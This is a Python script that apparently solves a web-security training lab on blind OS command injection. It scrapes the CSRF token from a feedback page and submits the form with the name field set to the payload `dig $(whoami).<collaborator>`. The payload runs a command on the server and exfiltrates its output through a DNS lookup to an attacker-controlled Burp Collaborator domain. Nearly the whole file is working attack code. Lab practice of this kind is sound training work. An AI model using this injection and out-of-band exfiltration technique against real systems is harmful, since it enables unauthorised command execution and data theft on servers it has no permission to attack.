import requests
import re
import urllib3
from colorama import Fore

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

LAB_NAME = "Blind OS command injection with out-of-band data exfiltration"

def run(url, payload=None, proxies=None):
    print(Fore.YELLOW + f"Steps to solve the lab:")
    print(Fore.WHITE + f"""1. Fetch the feedback page\n2. Extract the csrf token and session cookie\n3. Inject payload into the name field when submitting a feedback to execute the `whoami` command and exfiltrate the output via a DNS query to burp collaborator.\n4. Check your burp collaborator for the output of the `whoami` command\n""")

    session = requests.Session()
    session.proxies = proxies or {}
    session.verify = False
    url = url.rstrip('/')

    print(Fore.WHITE + "[*] Fetching the feedback page...", flush=True)
    try:
        feedback_page = session.get(f"{url}/feedback", allow_redirects=False)
    except Exception as e:
        print(Fore.RED + f"[!] Failed to fetch feedback page: {e}")
        return False

    print(Fore.WHITE + "[*] Extracting CSRF token...", flush=True)
    try:
        csrf_token = re.search(r'name="csrf"\s+value="(.+?)"', feedback_page.text).group(1)
    except Exception:
        print(Fore.RED + "[!] Failed to extract CSRF token.")
        return False

    collaborator = input(Fore.CYAN + "[?] Enter your Burp Collaborator URL (e.g. abc.oastify.com): ").strip()
    print(Fore.WHITE + f"[*] Using Collaborator URL: {Fore.YELLOW}{collaborator}")

    # Step 3: Injecting Payload
    print(Fore.WHITE + "[*] Injecting payload to exfiltrate `whoami` output via DNS...")
    payload = f"`dig $(whoami).{collaborator}`"
    data = {
        "csrf": csrf_token,
        "name": payload,
        "email": "mystic_mido@snehbavarva.com",
        "subject": "snehbavarva.com",
        "message": "snehbavarva.com"
    }

    try:
        session.post(f"{url}/feedback/submit", data=data, allow_redirects=False)
    except Exception as e:
        print(Fore.RED + f"[!] Failed to submit payload: {e}")
        return False

    print(Fore.GREEN + "[+] Payload sent! Check your Burp Collaborator for the exfiltrated `whoami` output.")
    print(Fore.CYAN + f"[!] Look for DNS queries like: <username>.{collaborator}")
    print(Fore.CYAN + "[!] The subdomain prefix is the `whoami` result.")

    return True
